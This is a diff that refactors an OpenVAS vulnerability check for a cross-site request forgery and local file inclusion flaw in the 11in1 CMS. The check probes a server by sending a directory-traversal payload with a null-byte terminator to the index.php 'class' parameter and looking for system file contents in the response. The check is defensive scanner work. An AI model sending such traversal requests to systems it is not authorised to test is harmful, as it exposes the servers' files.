@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_11in1_52025.nasl 5633 2017-03-20 15:56:23Z cfi $
+# $Id: gb_11in1_52025.nasl 5700 2017-03-23 16:03:37Z cfi $
 #
 # 11in1 Cross Site Request Forgery and Local File Include Vulnerabilities
 #
@@ -35,66 +35,58 @@ arbitrary files in the context of the affected application.
 
 11in1 1.2.1 is vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(103424);
  script_bugtraq_id(52025);
  script_cve_id("CVE-2012-0996","CVE-2012-0997");
- script_version ("$Revision: 5633 $");
-
+ script_version ("$Revision: 5700 $");
  script_name("11in1 Cross Site Request Forgery and Local File Include Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52025");
  script_xref(name : "URL" , value : "http://www.11in1.org/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521660");
-
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
- script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:56:23 +0100 (Mon, 20 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 17:03:37 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-02-16 11:39:18 +0100 (Thu, 16 Feb 2012)");
- script_summary("Determine if installed 11in1 is vulnerable");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
+
  script_tag(name : "summary" , value : tag_summary);
+
  exit(0);
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!get_port_state(port))exit(0);
-
-if(!can_host_php(port:port))exit(0);
-
-dirs = make_list("/11in1","/cms",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/11in1", "/cms", cgi_dirs( port:port ) ) ) {
 
-  url = string(dir, "/index.php");
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
 
-  if(http_vuln_check(port:port, url:url,pattern:"generator.*11in1\.org")) {
-
-    foreach file (keys(files)) {
-   
-      url = string(dir, "/index.php?class=",crap(data:"../",length:6*9),files[file],"%00"); 
-
-      if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-        security_message(port:port);
-        exit(0);
-
+  if( buf =~ "generator.*11in1\.org" ) {
+    foreach file( keys( files ) ) {
+      url = dir + "/index.php?class=" + crap( data:"../", length:6 * 9 ) + files[file] + "%00";
+      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
       }
     }  
   }
 }
-exit(0);
+
+exit( 99 );
